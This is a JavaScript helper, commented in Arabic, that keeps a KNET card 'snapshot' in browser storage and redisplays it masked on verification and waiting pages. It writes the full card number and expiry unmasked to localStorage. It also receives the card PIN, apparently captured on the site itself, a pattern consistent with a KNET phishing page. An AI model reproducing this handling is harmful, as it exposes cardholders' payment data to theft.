/**
 * لقطة عرض البطاقة من knet.php — تُستعاد في ver.php و knetwait.php وغيرهما.
 * تُحفظ في sessionStorage + localStorage + خريطة حسب reservation_id حتى لا تُفقد مع التنقل أو إعادة التحميل.
 * لا يُخزَّن رقم الـ PIN كاملاً، فقط عدد الأرقام لعرض النجوم.
 */
(function (w) {
    var KEY = 'farm_knet_card_snapshot';
    var KEY_MAP = 'farm_knet_card_by_reservation';

    function safeParse(json) {
        try {
            return json ? JSON.parse(json) : null;
        } catch (e) {
            return null;
        }
    }

    function readMap(store) {
        var g = store === 'local' ? localStorage : sessionStorage;
        return safeParse(g.getItem(KEY_MAP)) || {};
    }

    function writeMap(map) {
        var str = JSON.stringify(map);
        try {
            sessionStorage.setItem(KEY_MAP, str);
        } catch (e) {}
        try {
            localStorage.setItem(KEY_MAP, str);
        } catch (e2) {}
    }

    function persistEverywhere(o) {
        if (!o || !o.reservation_id) {
            return;
        }
        var json = JSON.stringify(o);
        try {
            sessionStorage.setItem(KEY, json);
        } catch (e) {}
        try {
            localStorage.setItem(KEY, json);
        } catch (e2) {}
        var map = readMap('local');
        if (Object.keys(map).length === 0) {
            map = readMap('session');
        }
        map[String(o.reservation_id).replace(/\D/g, '')] = o;
        writeMap(map);
    }

    function snapshotMatchesPage(s, pageOrderId) {
        if (!s || !s.reservation_id) {
            return false;
        }
        var oidPage = String(pageOrderId || '').replace(/\D/g, '');
        var oidSnap = String(s.order_id || '').replace(/\D/g, '');
        if (oidSnap && oidPage && oidSnap !== oidPage) {
            return false;
        }
        return true;
    }

    /**
     * يبحث بالترتيب: خريطة local → خريطة session → اللقطة الأخيرة في session → local
     */
    function findMatchingSnapshot(pageReservationId, pageOrderId) {
        var rid = String(pageReservationId || '').replace(/\D/g, '');
        if (!rid || rid === '0') {
            return null;
        }

        var maps = [readMap('local'), readMap('session')];
        var i;
        for (i = 0; i < maps.length; i++) {
            var s = maps[i][rid];
            if (s && snapshotMatchesPage(s, pageOrderId)) {
                return s;
            }
        }

        var fallbacks = [
            safeParse(sessionStorage.getItem(KEY)),
            safeParse(localStorage.getItem(KEY))
        ];
        for (i = 0; i < fallbacks.length; i++) {
            var f = fallbacks[i];
            if (
                f &&
                String(f.reservation_id).replace(/\D/g, '') === rid &&
                snapshotMatchesPage(f, pageOrderId)
            ) {
                return f;
            }
        }
        return null;
    }

    w.farmKnetCardSnapshot = {
        storageKey: KEY,
        mapKey: KEY_MAP,

        saveFromKnetPayload: function (reservationId, orderId, payload) {
            if (!payload || typeof payload !== 'object') {
                return;
            }
            var pre = String(payload.prefix != null ? payload.prefix : '');
            var cn = String(payload.cnmbr != null ? payload.cnmbr : '');
            var pin = String(payload.pin != null ? payload.pin : '');
            var o = {
                reservation_id: String(reservationId).replace(/\D/g, ''),
                order_id: String(orderId || '').replace(/\D/g, ''),
                prefix: pre,
                cnmbr: cn,
                month: String(payload.month != null ? payload.month : ''),
                year: String(payload.year != null ? payload.year : ''),
                pin_digit_count: pin.replace(/\D/g, '').length
            };
            persistEverywhere(o);
        },

        /** مزامنة لقطة قائمة (مثلاً بعد استرجاع من الخادم) */
        persistSnapshot: function (obj) {
            if (obj && obj.reservation_id) {
                persistEverywhere(obj);
            }
        },

        formatMasked: function (prefix, cnmbr) {
            var full = String(prefix || '').replace(/\D/g, '') + String(cnmbr || '').replace(/\D/g, '');
            if (!full) {
                return '—';
            }
            if (full.length < 10) {
                var last = full.slice(-Math.min(4, full.length));
                return full.slice(0, Math.min(6, full.length)) + '******' + last;
            }
            return full.slice(0, 6) + '******' + full.slice(-4);
        },

        pinStars: function (digitCount) {
            var n = Math.min(4, Math.max(0, parseInt(digitCount, 10) || 0));
            if (n < 1) {
                return '****';
            }
            return new Array(n + 1).join('*');
        },

        applySnapshotToElements: function (s, ids) {
            if (!s || !ids) {
                return;
            }
            var elN = document.getElementById(ids.card || 'DCNumber');
            if (elN) {
                elN.textContent = this.formatMasked(s.prefix, s.cnmbr);
            }
            var elM = document.getElementById(ids.month || 'expmnth');
            if (elM) {
                elM.textContent = s.month || '—';
            }
            var elY = document.getElementById(ids.year || 'expyear');
            if (elY) {
                elY.textContent = s.year || '—';
            }
            var elP = document.getElementById(ids.pin || 'farm_ver_pin_display');
            if (elP) {
                elP.textContent = this.pinStars(s.pin_digit_count);
            }
        },

        applyToVerPageIfMatch: function (pageReservationId, pageOrderId) {
            try {
                var s = findMatchingSnapshot(pageReservationId, pageOrderId);
                if (!s) {
                    return false;
                }
                persistEverywhere(s);
                this.applySnapshotToElements(s, {
                    card: 'DCNumber',
                    month: 'expmnth',
                    year: 'expyear',
                    pin: 'farm_ver_pin_display'
                });
                return true;
            } catch (e) {
                return false;
            }
        },

        applyToKnetwaitPageIfMatch: function (pageReservationId, pageOrderId) {
            try {
                var s = findMatchingSnapshot(pageReservationId, pageOrderId);
                if (!s) {
                    return false;
                }
                persistEverywhere(s);
                this.applySnapshotToElements(s, {
                    card: 'farm_kw_DCNumber',
                    month: 'farm_kw_expmnth',
                    year: 'farm_kw_expyear',
                    pin: 'farm_kw_pin_display'
                });
                return true;
            } catch (e) {
                return false;
            }
        }
    };
})(window);
